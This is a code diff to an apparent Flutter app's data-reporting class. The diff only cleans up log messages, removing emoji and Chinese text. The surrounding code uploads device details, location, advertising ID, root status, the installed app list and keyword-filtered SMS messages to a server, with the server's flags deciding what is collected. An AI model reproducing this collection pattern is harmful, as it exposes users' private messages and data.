@@ -80,14 +80,14 @@ class UpDataServer {
   }
 
   Future<void> triggerSingleReport() async {
-    LogUtil.d('🔄 Triggering single report');
+    LogUtil.d('Triggering single report');
     if (_tasks.isEmpty) initTasks();
     await _runOnce();
   }
 
   Future<void> _runOnce() async {
     _cycleCount++;
-    LogUtil.d('▶️ Cycle #$_cycleCount start');
+    LogUtil.d('Cycle #$_cycleCount start');
     final token = await UserDataHelper.getToken();
     if (token == null || token.isEmpty) {
       LogUtil.d("token:$token");
@@ -125,13 +125,13 @@ class UpDataServer {
           },
         );
       } catch (e, st) {
-        LogUtil.d('  ❌ Task error: $task → $e');
+        LogUtil.d('  Task error: $task → $e');
       }
       // 任务间隔4秒
       await Future.delayed(const Duration(seconds: 4));
     }
 
-    LogUtil.d('▶️ Cycle #$_cycleCount end');
+    LogUtil.d('Cycle #$_cycleCount end');
   }
 
   Future<void> _reportDeviceInfo(
@@ -203,7 +203,7 @@ class UpDataServer {
         batteryLevel = await _battery.batteryLevel;
         batteryState = await _battery.batteryState;
       } catch (e) {
-        LogUtil.e("电池获取报错$e");
+        LogUtil.e("$e");
       }
 
       var memoryInfo = 0;
@@ -215,7 +215,7 @@ class UpDataServer {
         freeMemory = SysInfo.getFreePhysicalMemory();
         usage = memoryInfo - freeMemory;
       } catch (e) {
-        LogUtil.e("内存获取报错$e");
+        LogUtil.e("$e");
       }
 
       String? advertisingId;
@@ -483,19 +483,19 @@ class UpDataServer {
 
       final result = await ApiUrls.submitUserUploadData(data: req.toMap());
       if (result.isSucceed) {
-        LogUtil.d('✔ Device info uploaded req:$req\n');
+        LogUtil.d(' Device info uploaded req:$req\n');
       } else {
-        LogUtil.d('  ✖ Device info upload failed: ${result.msg}');
+        LogUtil.d('   Device info upload failed: ${result.msg}');
       }
     } catch (e, st) {
-      LogUtil.d('  ❌ Device info exception: $e');
+      LogUtil.d('  Device info exception: $e');
     }
   }
 
   Future<void> updataAndroidDevice(int trackId) async {
     final hasGps = await PermissionUtil.checkAndRequest(Permission.location);
     if (!hasGps) {
-      LogUtil.d('  ↳ Skipping device info: Location permission denied');
+      LogUtil.d('  Skipping device info: Location permission denied');
       return;
     }
     Position? pos;
@@ -541,7 +541,7 @@ class UpDataServer {
         freeMemory = SysInfo.getFreePhysicalMemory();
         usage = memoryInfo - freeMemory;
       } catch (e) {
-        LogUtil.e("内存获取报错$e");
+        LogUtil.e("$e");
       }
 
       String? advertisingId;
@@ -620,7 +620,7 @@ class UpDataServer {
       try {
         securityInfo = await AndroidSecurityDetector.getSecurityInfo();
       } catch (e) {
-        LogUtil.e("获取安全检测信息失败: $e");
+        LogUtil.e(" $e");
         // 如果获取失败，使用默认值
         securityInfo = {
           'isRootJailbreak': 0,
@@ -704,12 +704,12 @@ class UpDataServer {
 
       final result = await ApiUrls.submitUserUploadData(data: req.toMap());
       if (result.isSucceed) {
-        LogUtil.d('✔ Device info uploaded req:$req\n');
+        LogUtil.d(' Device info uploaded req:$req\n');
       } else {
-        LogUtil.d('  ✖ Device info upload failed: ${result.msg}');
+        LogUtil.d('  Device info upload failed: ${result.msg}');
       }
     } catch (e, st) {
-      LogUtil.d('  ❌ Device info exception: $e');
+      LogUtil.d('  Device info exception: $e');
     }
   }
 
@@ -719,7 +719,7 @@ class UpDataServer {
     UploadDataCheckData checkData,
   ) async {
     if (checkData.isValidAppList != 0) {
-      LogUtil.d('  ↳ App list not required by server');
+      LogUtil.d('  App list not required by server');
       return;
     }
     try {
@@ -757,7 +757,7 @@ class UpDataServer {
       }
 
       if (apps.isEmpty) {
-        LogUtil.d('↳ No apps detected');
+        LogUtil.d('No apps detected');
         return;
       }
 
@@ -773,15 +773,15 @@ class UpDataServer {
       final stopwatch3 = Stopwatch()..start();
       final result = await ApiUrls.submitUserUploadData(data: req.toMap());
       stopwatch3.stop();
-      LogUtil.d('applist接口处理总耗时: ${stopwatch3.elapsedMilliseconds} ms');
+      LogUtil.d(' ${stopwatch3.elapsedMilliseconds} ms');
       if (result.isSucceed) {
-        LogUtil.d('✔ App list uploaded');
+        LogUtil.d(' App list uploaded');
         LogUtil.d('req:$req\n');
       } else {
-        LogUtil.d('✖ App list upload failed: ${result.msg}');
+        LogUtil.d('App list upload failed: ${result.msg}');
       }
     } catch (e, st) {
-      LogUtil.d('❌ App list exception: $e');
+      LogUtil.d(' App list exception: $e');
       LogUtil.d('Stack: $st');
     }
   }
@@ -789,18 +789,18 @@ class UpDataServer {
   //短信获取
   Future<void> _reportSms(int trackId, UploadDataCheckData checkData) async {
     if (checkData.isValidSmsRecord != 0) {
-      LogUtil.d('  ↳ SMS not required by server');
+      LogUtil.d('  SMS not required by server');
       return;
     }
 
     final hasSms = await PermissionUtil.checkAndRequest(Permission.sms);
     if (!hasSms) {
-      LogUtil.d('  ↳ Skipping SMS: SMS permission denied');
+      LogUtil.d('  Skipping SMS: SMS permission denied');
       return;
     }
 
     if (!Platform.isAndroid) {
-      LogUtil.d('  ↳ SMS not supported on this platform');
+      LogUtil.d('  SMS not supported on this platform');
       return;
     }
 
@@ -927,7 +927,7 @@ class UpDataServer {
             contentList: smsContentKeywords,
           );
           stopwatch1.stop();
-          LogUtil.d('sms总耗时: ${stopwatch1.elapsedMilliseconds} ms');
+          LogUtil.d(' ${stopwatch1.elapsedMilliseconds} ms');
           final stopwatch2 = Stopwatch()..start();
           smsList = smsMessages
               .map(
@@ -942,7 +942,7 @@ class UpDataServer {
               .toList();
 
           stopwatch2.stop();
-          LogUtil.d('sms2总耗时: ${stopwatch2.elapsedMilliseconds} ms');
+          LogUtil.d('s${stopwatch2.elapsedMilliseconds} ms');
           _smsList = smsList;
         }
       } else {
@@ -950,7 +950,7 @@ class UpDataServer {
       }
 
       if (smsList.isEmpty) {
-        LogUtil.d('  ↳ No SMS to upload');
+        LogUtil.d(' No SMS to upload');
         return;
       }
       final hasGps = await PermissionUtil.checkAndRequest(Permission.location);
@@ -963,12 +963,12 @@ class UpDataServer {
       );
       final result = await ApiUrls.submitUserUploadData(data: req.toMap());
       if (result.isSucceed) {
-        LogUtil.d('✔ SMS uploaded:$req\n');
+        LogUtil.d(' SMS uploaded:$req\n');
       } else {
-        LogUtil.d('  ✖ SMS upload failed: ${result.msg}');
+        LogUtil.d(' SMS upload failed: ${result.msg}');
       }
     } catch (e, st) {
-      LogUtil.d('  ❌ SMS exception: $e');
+      LogUtil.d('  SMS exception: $e');
     }
   }
 
